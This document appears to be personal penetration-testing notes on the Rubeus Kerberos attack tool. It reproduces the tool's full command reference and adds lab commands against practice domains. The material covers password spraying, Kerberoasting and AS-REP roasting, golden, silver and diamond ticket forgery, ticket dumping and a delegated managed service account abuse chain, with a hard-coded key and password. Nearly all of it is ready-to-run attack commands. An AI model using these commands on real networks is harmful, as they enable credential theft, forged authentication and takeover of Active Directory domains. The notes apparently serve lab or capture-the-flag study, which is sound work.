
|Command|Description|
|---|---|
|[asktgt](https://github.com/GhostPack/Rubeus?tab=readme-ov-file#asktgt)|Request a ticket-granting-ticket (TGT) from a hash/key or password|
|[asktgs](https://github.com/GhostPack/Rubeus?tab=readme-ov-file#asktgs)|Request a service ticket from a passed TGT|
|[renew](https://github.com/GhostPack/Rubeus?tab=readme-ov-file#renew)|Renew (or autorenew) a TGT or service ticket|
|[brute](https://github.com/GhostPack/Rubeus?tab=readme-ov-file#brute)|Perform a Kerberos-based password bruteforcing attack. 'spray' can also be used instead of 'brute'|
|[preauthscan](https://github.com/GhostPack/Rubeus?tab=readme-ov-file#preauthscan)|Preform a scan for accounts that do not require Kerberos pre-authentication|

```
    Retrieve a TGT based on a user password/hash, optionally saving to a file or applying to the current logon session or a specific LUID:
        Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap] [/opsec] [/nopac] [/proxyurl:https://KDC_PROXY/kdcproxy] [/suppenctype:DES|RC4|AES128|AES256]

    Retrieve a TGT based on a user password/hash, optionally saving to a file or applying to the current logon session or a specific LUID:
        Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap] [/opsec] [/nopac] [/proxyurl:https://KDC_PROXY/kdcproxy] [/suppenctype:DES|RC4|AES128|AES256]

    Retrieve a TGT based on a user password/hash, start a /netonly process, and to apply the ticket to the new process/logon session:
        Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> /createnetonly:C:\Windows\System32\cmd.exe [/show] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/nowrap] [/opsec] [/nopac] [/proxyurl:https://KDC_PROXY/kdcproxy] [/suppenctype:DES|RC4|AES128|AES256]

    Retrieve a TGT using a PCKS12 certificate, start a /netonly process, and to apply the ticket to the new process/logon session:
        Rubeus.exe asktgt /user:USER /certificate:C:\temp\leaked.pfx </password:STOREPASSWORD> /createnetonly:C:\Windows\System32\cmd.exe [/getcredentials] [/servicekey:KRBTGTKEY] [/show] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/nowrap] [/proxyurl:https://KDC_PROXY/kdcproxy] [/suppenctype:DES|RC4|AES128|AES256]

    Retrieve a TGT using a certificate from the users keystore (Smartcard) specifying certificate thumbprint or subject, start a /netonly process, and to apply the ticket to the new process/logon session:
        Rubeus.exe asktgt /user:USER /certificate:f063e6f4798af085946be6cd9d82ba3999c7ebac /createnetonly:C:\Windows\System32\cmd.exe [/show] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/suppenctype:DES|RC4|AES128|AES256] [/nowrap]

    Retrieve a TGT suitable for changing an account with an expired password using the changepw command
        Rubeus.exe asktgt /user:USER </password:PASSWORD /changepw [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap] [/opsec] [/proxyurl:https://KDC_PROXY/kdcproxy]

    Request a TGT without sending pre-auth data:
        Rubeus.exe asktgt /user:USER [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap] [/nopac] [/proxyurl:https://KDC_PROXY/kdcproxy] [/suppenctype:DES|RC4|AES128|AES256]

    Request a service ticket using an AS-REQ:
        Rubeus.exe asktgt /user:USER /service:SPN </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap] [/opsec] [/nopac] [/oldsam] [/proxyurl:https://KDC_PROXY/kdcproxy] [/suppenctype:DES|RC4|AES128|AES256]

   Retrieve a service ticket for one or more SPNs, optionally saving or applying the ticket:
        Rubeus.exe asktgs </ticket:BASE64 | /ticket:FILE.KIRBI> </service:SPN1,SPN2,...> [/enctype:DES|RC4|AES128|AES256] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/nowrap] [/enterprise] [/opsec] </tgs:BASE64 | /tgs:FILE.KIRBI> [/targetdomain] [/u2u] [/targetuser] [/servicekey:PASSWORDHASH] [/asrepkey:ASREPKEY] [/proxyurl:https://KDC_PROXY/kdcproxy]

Retrieve a service ticket using the Kerberos Key List Request options:
    	Rubeus.exe asktgs /keyList /service:KRBTGT_SPN </ticket:BASE64 | /ticket:FILE.KIRBI> [/enctype:DES|RC4|AES128|AES256] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/nowrap] [/enterprise] [/opsec] </tgs:BASE64 | /tgs:FILE.KIRBI> [/targetdomain] [/u2u] [/targetuser] [/servicekey:PASSWORDHASH] [/asrepkey:ASREPKEY] [/proxyurl:https://KDC_PROXY/kdcproxy]

Retrieve a delegated managed service account ticket:
    	Rubeus.exe asktgs /dmsa /opsec /service:KRBTGT_SPN /targetuser:DMSA_ACCOUNT$ </ticket:BASE64 | /ticket:FILE.KIRBI> [/dc:DOMAIN_CONTROLLER_Win2025] [/outfile:FILENAME] [/ptt] [/nowrap] [/servicekey:PASSWORDHASH] [/asrepkey:ASREPKEY] [/proxyurl:https://KDC_PROXY/kdcproxy]

    Renew a TGT, optionally applying the ticket, saving it, or auto-renewing the ticket up to its renew-till limit:
        Rubeus.exe renew </ticket:BASE64 | /ticket:FILE.KIRBI> [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/autorenew] [/nowrap]

    Perform a Kerberos-based password bruteforcing attack:
        Rubeus.exe brute </password:PASSWORD | /passwords:PASSWORDS_FILE> [/user:USER | /users:USERS_FILE] [/domain:DOMAIN] [/creduser:DOMAIN\\USER & /credpassword:PASSWORD] [/ou:ORGANIZATION_UNIT] [/dc:DOMAIN_CONTROLLER] [/outfile:RESULT_PASSWORD_FILE] [/noticket] [/verbose] [/nowrap]

    Perform a scan for account that do not require pre-authentication:
        Rubeus.exe preauthscan /users:C:\temp\users.txt [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/proxyurl:https://KDC_PROXY/kdcproxy]


 Constrained delegation abuse:

    Perform S4U constrained delegation abuse:
        Rubeus.exe s4u </ticket:BASE64 | /ticket:FILE.KIRBI> </impersonateuser:USER | /tgs:BASE64 | /tgs:FILE.KIRBI> /msdsspn:SERVICE/SERVER [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/nowrap] [/opsec] [/self] [/proxyurl:https://KDC_PROXY/kdcproxy] [/createnetonly:C:\Windows\System32\cmd.exe] [/show]
        Rubeus.exe s4u /user:USER </rc4:HASH | /aes256:HASH> [/domain:DOMAIN] </impersonateuser:USER | /tgs:BASE64 | /tgs:FILE.KIRBI> /msdsspn:SERVICE/SERVER [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/nowrap] [/opsec] [/self] [/bronzebit] [/nopac] [/proxyurl:https://KDC_PROXY/kdcproxy] [/createnetonly:C:\Windows\System32\cmd.exe] [/show]

    Perform S4U constrained delegation abuse across domains:
        Rubeus.exe s4u /user:USER </rc4:HASH | /aes256:HASH> [/domain:DOMAIN] </impersonateuser:USER | /tgs:BASE64 | /tgs:FILE.KIRBI> /msdsspn:SERVICE/SERVER /targetdomain:DOMAIN.LOCAL /targetdc:DC.DOMAIN.LOCAL [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/nowrap] [/self] [/nopac] [/createnetonly:C:\Windows\System32\cmd.exe] [/show]


 Ticket Forgery:

    Forge a golden ticket using LDAP to gather the relevent information:
        Rubeus.exe golden </des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> </user:USERNAME> /ldap [/printcmd] [outfile:FILENAME] [/ptt]

    Forge a golden ticket using LDAP to gather the relevent information but explicitly overriding some values:
        Rubeus.exe golden </des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> </user:USERNAME> /ldap [/dc:DOMAIN_CONTROLLER] [/domain:DOMAIN] [/netbios:NETBIOS_DOMAIN] [/sid:DOMAIN_SID] [/dispalyname:PAC_FULL_NAME] [/badpwdcount:INTEGER] [/flags:TICKET_FLAGS] [/uac:UAC_FLAGS] [/groups:GROUP_IDS] [/pgid:PRIMARY_GID] [/homedir:HOMEDIR] [/homedrive:HOMEDRIVE] [/id:USER_ID] [/logofftime:LOGOFF_TIMESTAMP] [/lastlogon:LOGON_TIMESTAMP] [/logoncount:INTEGER] [/passlastset:PASSWORD_CHANGE_TIMESTAMP] [/maxpassage:RELATIVE_TO_PASSLASTSET] [/minpassage:RELATIVE_TO_PASSLASTSET] [/profilepath:PROFILE_PATH] [/scriptpath:LOGON_SCRIPT_PATH] [/sids:EXTRA_SIDS] [[/resourcegroupsid:RESOURCEGROUPS_SID] [/resourcegroups:GROUP_IDS]] [/authtime:AUTH_TIMESTAMP] [/starttime:Start_TIMESTAMP] [/endtime:RELATIVE_TO_STARTTIME] [/renewtill:RELATIVE_TO_STARTTIME] [/rangeend:RELATIVE_TO_STARTTIME] [/rangeinterval:RELATIVE_INTERVAL] [/oldpac] [/extendedupndns] [/printcmd] [outfile:FILENAME] [/ptt]

    Forge a golden ticket, setting values explicitly:
        Rubeus.exe golden </des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> </user:USERNAME> </domain:DOMAIN> </sid:DOMAIN_SID> [/dc:DOMAIN_CONTROLLER] [/netbios:NETBIOS_DOMAIN] [/dispalyname:PAC_FULL_NAME] [/badpwdcount:INTEGER] [/flags:TICKET_FLAGS] [/uac:UAC_FLAGS] [/groups:GROUP_IDS] [/pgid:PRIMARY_GID] [/homedir:HOMEDIR] [/homedrive:HOMEDRIVE] [/id:USER_ID] [/logofftime:LOGOFF_TIMESTAMP] [/lastlogon:LOGON_TIMESTAMP] [/logoncount:INTEGER] [/passlastset:PASSWORD_CHANGE_TIMESTAMP] [/maxpassage:RELATIVE_TO_PASSLASTSET] [/minpassage:RELATIVE_TO_PASSLASTSET] [/profilepath:PROFILE_PATH] [/scriptpath:LOGON_SCRIPT_PATH] [/sids:EXTRA_SIDS] [[/resourcegroupsid:RESOURCEGROUPS_SID] [/resourcegroups:GROUP_IDS]] [/authtime:AUTH_TIMESTAMP] [/starttime:Start_TIMESTAMP] [/endtime:RELATIVE_TO_STARTTIME] [/renewtill:RELATIVE_TO_STARTTIME] [/rangeend:RELATIVE_TO_STARTTIME] [/rangeinterval:RELATIVE_INTERVAL] [/oldpac] [/extendedupndns] [/printcmd] [outfile:FILENAME] [/ptt]

    Forge a silver ticket using LDAP to gather the relevent information:
        Rubeus.exe silver </des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> </user:USERNAME> </service:SPN> /ldap [/extendedupndns] [/nofullpacsig] [/printcmd] [outfile:FILENAME] [/ptt]

    Forge a silver ticket using LDAP to gather the relevent information, using the KRBTGT key to calculate the KDCChecksum and TicketChecksum:
        Rubeus.exe silver </des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> </user:USERNAME> </service:SPN> /ldap </krbkey:HASH> [/krbenctype:DES|RC4|AES128|AES256] [/extendedupndns] [/nofullpacsig] [/printcmd] [outfile:FILENAME] [/ptt]

    Forge a silver ticket using LDAP to gather the relevent information but explicitly overriding some values:
        Rubeus.exe silver </des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> </user:USERNAME> </service:SPN> /ldap [/dc:DOMAIN_CONTROLLER] [/domain:DOMAIN] [/netbios:NETBIOS_DOMAIN] [/sid:DOMAIN_SID] [/dispalyname:PAC_FULL_NAME] [/badpwdcount:INTEGER] [/flags:TICKET_FLAGS] [/uac:UAC_FLAGS] [/groups:GROUP_IDS] [/pgid:PRIMARY_GID] [/homedir:HOMEDIR] [/homedrive:HOMEDRIVE] [/id:USER_ID] [/logofftime:LOGOFF_TIMESTAMP] [/lastlogon:LOGON_TIMESTAMP] [/logoncount:INTEGER] [/passlastset:PASSWORD_CHANGE_TIMESTAMP] [/maxpassage:RELATIVE_TO_PASSLASTSET] [/minpassage:RELATIVE_TO_PASSLASTSET] [/profilepath:PROFILE_PATH] [/scriptpath:LOGON_SCRIPT_PATH] [/sids:EXTRA_SIDS] [[/resourcegroupsid:RESOURCEGROUPS_SID] [/resourcegroups:GROUP_IDS]] [/authtime:AUTH_TIMESTAMP] [/starttime:Start_TIMESTAMP] [/endtime:RELATIVE_TO_STARTTIME] [/renewtill:RELATIVE_TO_STARTTIME] [/rangeend:RELATIVE_TO_STARTTIME] [/rangeinterval:RELATIVE_INTERVAL] [/authdata] [/extendedupndns] [/nofullpacsig] [/printcmd] [outfile:FILENAME] [/ptt]

    Forge a silver ticket using LDAP to gather the relevent information and including an S4U Delegation Info PAC section:
        Rubeus.exe silver </des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> </user:USERNAME> </service:SPN> /ldap [/s4uproxytarget:TARGETSPN] [/s4utransitedservices:SPN1,SPN2,...] [/printcmd] [outfile:FILENAME] [/ptt]

    Forge a silver ticket using LDAP to gather the relevent information and setting a different cname and crealm:
        Rubeus.exe silver </des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> </user:USERNAME> </service:SPN> /ldap [/cname:CLIENTNAME] [/crealm:CLIENTDOMAIN] [/printcmd] [outfile:FILENAME] [/ptt]

    Forge a silver ticket, setting values explicitly:
        Rubeus.exe silver </des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> </user:USERNAME> </service:SPN> </domain:DOMAIN> </sid:DOMAIN_SID> [/dc:DOMAIN_CONTROLLER] [/netbios:NETBIOS_DOMAIN] [/dispalyname:PAC_FULL_NAME] [/badpwdcount:INTEGER] [/flags:TICKET_FLAGS] [/uac:UAC_FLAGS] [/groups:GROUP_IDS] [/pgid:PRIMARY_GID] [/homedir:HOMEDIR] [/homedrive:HOMEDRIVE] [/id:USER_ID] [/logofftime:LOGOFF_TIMESTAMP] [/lastlogon:LOGON_TIMESTAMP] [/logoncount:INTEGER] [/passlastset:PASSWORD_CHANGE_TIMESTAMP] [/maxpassage:RELATIVE_TO_PASSLASTSET] [/minpassage:RELATIVE_TO_PASSLASTSET] [/profilepath:PROFILE_PATH] [/scriptpath:LOGON_SCRIPT_PATH] [/sids:EXTRA_SIDS] [[/resourcegroupsid:RESOURCEGROUPS_SID] [/resourcegroups:GROUP_IDS]] [/authtime:AUTH_TIMESTAMP] [/starttime:Start_TIMESTAMP] [/endtime:RELATIVE_TO_STARTTIME] [/renewtill:RELATIVE_TO_STARTTIME] [/rangeend:RELATIVE_TO_STARTTIME] [/rangeinterval:RELATIVE_INTERVAL] [/authdata] [/cname:CLIENTNAME] [/crealm:CLIENTDOMAIN] [/s4uproxytarget:TARGETSPN] [/s4utransitedservices:SPN1,SPN2,...] [/extendedupndns] [/nofullpacsig] [/printcmd] [outfile:FILENAME] [/ptt]

	Forge a diamond TGT by requesting a TGT based on a user password/hash:
		Rubeus.exe diamond /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/createnetonly:C:\Windows\System32\cmd.exe] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap] [/krbkey:HASH] [/ticketuser:USERNAME] [/ticketuserid:USER_ID] [/groups:GROUP_IDS] [/sids:EXTRA_SIDS]

	Forge a diamond TGT by requesting a TGT using a PCKS12 certificate:
		Rubeus.exe diamond /user:USER /certificate:C:\temp\leaked.pfx </password:STOREPASSWORD> [/createnetonly:C:\Windows\System32\cmd.exe] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap] [/krbkey:HASH] [/ticketuser:USERNAME] [/ticketuserid:USER_ID] [/groups:GROUP_IDS] [/sids:EXTRA_SIDS]

	Forge a diamond TGT by requesting a TGT using tgtdeleg:
		Rubeus.exe diamond /tgtdeleg [/createnetonly:C:\Windows\System32\cmd.exe] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap] [/krbkey:HASH] [/ticketuser:USERNAME] [/ticketuserid:USER_ID] [/groups:GROUP_IDS] [/sids:EXTRA_SIDS]


 Ticket management:

    Submit a TGT, optionally targeting a specific LUID (if elevated):
        Rubeus.exe ptt </ticket:BASE64 | /ticket:FILE.KIRBI> [/luid:LOGINID]

    Purge tickets from the current logon session, optionally targeting a specific LUID (if elevated):
        Rubeus.exe purge [/luid:LOGINID]

    Parse and describe a ticket (service ticket or TGT):
        Rubeus.exe describe </ticket:BASE64 | /ticket:FILE.KIRBI> [/servicekey:HASH] [/krbkey:HASH] [/asrepkey:HASH] [/serviceuser:USERNAME] [/servicedomain:DOMAIN] [/desplaintext:FIRSTBLOCKTEXT]


 Ticket extraction and harvesting:

    Triage all current tickets (if elevated, list for all users), optionally targeting a specific LUID, username, or service:
        Rubeus.exe triage [/luid:LOGINID] [/user:USER] [/service:krbtgt] [/server:BLAH.DOMAIN.COM]

    List all current tickets in detail (if elevated, list for all users), optionally targeting a specific LUID:
        Rubeus.exe klist [/luid:LOGINID] [/user:USER] [/service:krbtgt] [/server:BLAH.DOMAIN.COM]

    Dump all current ticket data (if elevated, dump for all users), optionally targeting a specific service/LUID:
        Rubeus.exe dump [/luid:LOGINID] [/user:USER] [/service:krbtgt] [/server:BLAH.DOMAIN.COM] [/nowrap]

    Retrieve a usable TGT .kirbi for the current user (w/ session key) without elevation by abusing the Kerberos GSS-API, faking delegation:
        Rubeus.exe tgtdeleg [/target:SPN]

    Monitor every /interval SECONDS (default 60) for new TGTs:
        Rubeus.exe monitor [/interval:SECONDS] [/targetuser:USER] [/nowrap] [/registry:SOFTWARENAME] [/runfor:SECONDS]

    Monitor every /monitorinterval SECONDS (default 60) for new TGTs, auto-renew TGTs, and display the working cache every /displayinterval SECONDS (default 1200):
        Rubeus.exe harvest [/monitorinterval:SECONDS] [/displayinterval:SECONDS] [/targetuser:USER] [/nowrap] [/registry:SOFTWARENAME] [/runfor:SECONDS]


 Roasting:

    Perform Kerberoasting:
        Rubeus.exe kerberoast [[/spn:"blah/blah"] | [/spns:C:\temp\spns.txt]] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps] [/nowrap]

    Perform Kerberoasting, outputting hashes to a file:
        Rubeus.exe kerberoast /outfile:hashes.txt [[/spn:"blah/blah"] | [/spns:C:\temp\spns.txt]] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps]

    Perform Kerberoasting, outputting hashes in the file output format, but to the console:
        Rubeus.exe kerberoast /simple [[/spn:"blah/blah"] | [/spns:C:\temp\spns.txt]] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps] [/nowrap]

    Perform Kerberoasting with alternate credentials:
        Rubeus.exe kerberoast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD [/spn:"blah/blah"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps] [/nowrap]

    Perform Kerberoasting with an existing TGT:
        Rubeus.exe kerberoast </spn:"blah/blah" | /spns:C:\temp\spns.txt> </ticket:BASE64 | /ticket:FILE.KIRBI> [/nowrap]

    Perform Kerberoasting with an existing TGT using an enterprise principal:
        Rubeus.exe kerberoast </spn:user@domain.com | /spns:user1@domain.com,user2@domain.com> /enterprise </ticket:BASE64 | /ticket:FILE.KIRBI> [/nowrap]

    Perform Kerberoasting with an existing TGT and automatically retry with the enterprise principal if any fail:
        Rubeus.exe kerberoast </ticket:BASE64 | /ticket:FILE.KIRBI> /autoenterprise [/ldaps] [/nowrap]

    Perform Kerberoasting using the tgtdeleg ticket to request service tickets - requests RC4 for AES accounts:
        Rubeus.exe kerberoast /usetgtdeleg [/ldaps] [/nowrap]

    Perform "opsec" Kerberoasting, using tgtdeleg, and filtering out AES-enabled accounts:
        Rubeus.exe kerberoast /rc4opsec [/ldaps] [/nowrap]

    List statistics about found Kerberoastable accounts without actually sending ticket requests:
        Rubeus.exe kerberoast /stats [/ldaps] [/nowrap]

    Perform Kerberoasting, requesting tickets only for accounts with an admin count of 1 (custom LDAP filter):
        Rubeus.exe kerberoast /ldapfilter:'admincount=1' [/ldaps] [/nowrap]

    Perform Kerberoasting, requesting tickets only for accounts whose password was last set between 01-31-2005 and 03-29-2010, returning up to 5 service tickets:
        Rubeus.exe kerberoast /pwdsetafter:01-31-2005 /pwdsetbefore:03-29-2010 /resultlimit:5 [/ldaps] [/nowrap]

    Perform Kerberoasting, with a delay of 5000 milliseconds and a jitter of 30%:
        Rubeus.exe kerberoast /delay:5000 /jitter:30 [/ldaps] [/nowrap]

    Perform AES Kerberoasting:
        Rubeus.exe kerberoast /aes [/ldaps] [/nowrap]

    Perform Kerberoasting using an account without pre-auth by sending AS-REQ's:
        Rubeus.exe kerberoast </spn:""blah/blah"" | /spns:C:\temp\spns.txt> /nopreauth:USER /domain:DOMAIN [/dc:DOMAIN_CONTROLLER] [/nowrap]

    Perform AS-REP "roasting" for any users without preauth:
        Rubeus.exe asreproast [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps] [/des] [/nowrap]

    Perform AS-REP "roasting" for any users without preauth, outputting Hashcat format to a file:
        Rubeus.exe asreproast /outfile:hashes.txt /format:hashcat [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps] [/des]

    Perform AS-REP "roasting" for any users without preauth using alternate credentials:
        Rubeus.exe asreproast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU,..."] [/ldaps] [/des] [/nowrap]


 Miscellaneous:

    Create a hidden program (unless /show is passed) with random /netonly credentials, displaying the PID and LUID:
        Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" [/show] [/ticket:BASE64 | /ticket:FILE.KIRBI]

    Reset a user's password from a supplied TGT (AoratoPw):
        Rubeus.exe changepw </ticket:BASE64 | /ticket:FILE.KIRBI> /new:PASSWORD [/dc:DOMAIN_CONTROLLER] [/targetuser:DOMAIN\USERNAME]

    Calculate rc4_hmac, aes128_cts_hmac_sha1, aes256_cts_hmac_sha1, and des_cbc_md5 hashes:
        Rubeus.exe hash /password:X [/user:USER] [/domain:DOMAIN]

    Substitute an sname or SPN into an existing service ticket:
        Rubeus.exe tgssub </ticket:BASE64 | /ticket:FILE.KIRBI> /altservice:ldap [/srealm:DOMAIN] [/ptt] [/luid] [/nowrap]
        Rubeus.exe tgssub </ticket:BASE64 | /ticket:FILE.KIRBI> /altservice:cifs/computer.domain.com [/srealm:DOMAIN] [/ptt] [/luid] [/nowrap]

    Display the current user's LUID:
        Rubeus.exe currentluid

    Display information about the (current) or (target) logon session, default all readable:
        Rubeus.exe logonsession [/current] [/luid:X]

    The "/consoleoutfile:C:\FILE.txt" argument redirects all console output to the file specified.

    The "/nowrap" flag prevents any base64 ticket blobs from being column wrapped for any function.

    The "/debug" flag outputs ASN.1 debugging information.
	
    Convert an AS-REP and a key to a Kirbi:
        Rubeus.exe asrep2kirbi /asrep:<BASE64 | FILEPATH> </key:BASE64 | /keyhex:HEXSTRING> [/enctype:DES|RC4|AES128|AES256] [/ptt] [/luid:X] [/nowrap]

    Insert new DES session key into a Kirbi:
        Rubeus.exe kirbi /kirbi:<BASE64 | FILEPATH> /sessionkey:SESSIONKEY /sessionetype:DES|RC4|AES128|AES256 [/ptt] [/luid:X] [outfile:FILENAME] [/nowrap]


 NOTE: Base64 ticket blobs can be decoded with :

    [IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("aa..."))
```


### AS-REPRoasting
```powershell
Rubeus.exe asreproast /format:hashcat # Enumeration
Rubeus.exe asreproast /user:Target.user /domain:inlanefreight.local /dc:dc01.inlanefreight.local /nowrap /outfile:hashes.txt # Attack
```

---
### kerberosting
```
Rubeus.exe kerberoast /nowrap
```

| Option                         | Description                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| ------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `/outfile:filename.txt`        | write the result to a file.                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| `/pwdsetafter` `/pwdsetbefore` | Kerberoast accounts whose password was set within a particular date                                                                                                                                                                                                                                                                                                                                                                                                       |
| `/stats`                       | list statistics about Kerberoastable accounts without sending any ticket requests. This can be useful for gathering information and checking the types of encryption the account tickets use.                                                                                                                                                                                                                                                                             |
| `/tgtdeleg`                    | useful for us in situations where we find accounts with the options `This account supports Kerberos AES 128-bit encryption` or `This account supports Kerberos AES 256-bit encryption` set, meaning that when we perform a Kerberoast attack, we will get a `AES-128 (type 17)` or `AES-256 (type 18)` TGS tickets back which can be significantly more difficult to crack than `RC4 (type 23)` tickets. we can use `/tgtdeleg` flag with Rubeus to force RC4 encryption. |
#### Kerberoasting without an Account Password
```batch
Rubeus.exe createnetonly /program:cmd.exe /show
Rubeus.exe kerberoast REM Error we need 
Rubeus.exe kerberoast /nopreauth:amber.smith /domain:inlanefreight.local /spn:MSSQLSvc/SQL01:1433 /nowrap
```
**Note:** Instead of `/spn` we can use `/spns:listofspn.txt` to try multiple SPNs.

| Option          | Description                                   |
| --------------- | --------------------------------------------- |
| `createnetonly` | utilize its CMD window to perform the attack. |

---

### Uncostrained delegation
```
.\Rubeus.exe monitor /interval:5 /nowrap
```

```
.\Rubeus.exe hash /password:'iloveyou1' /user:adam.scott /domain:eighteen.htb


.\Rubeus.exe asktgs /targetuser:bad_dmsa$ /service:krbtgt/eighteen.htb /opsec /dmsa /nowrap /ptt /ticket:<paste ticket> /outfile:ticket.kirbi

.\Rubeus.exe asktgt /user:0xprofound$ /aes256:493B757EE9BC71195C12D4AD6C778F85CD0AD2D3CD8E57D750261679766990C0 /domain:eighteen.htb /nowrap
.\Rubeus.exe asktgs /targetuser:0xprofoundDMSA /service:krbtgt/eighteen.htb /dmsa /opsec /ptt /nowrap /outfile:ticket.kirbi /ticket:


	.\Rubeus.exe asktgt /user:AttackComp$ /password:Hack123! /domain:eighteen.htb /dc:xxx.xxx.xxx.xxx /enctype:aes256 /nowrap .\Rubeus.exe ptt /ticket: < base64 >
```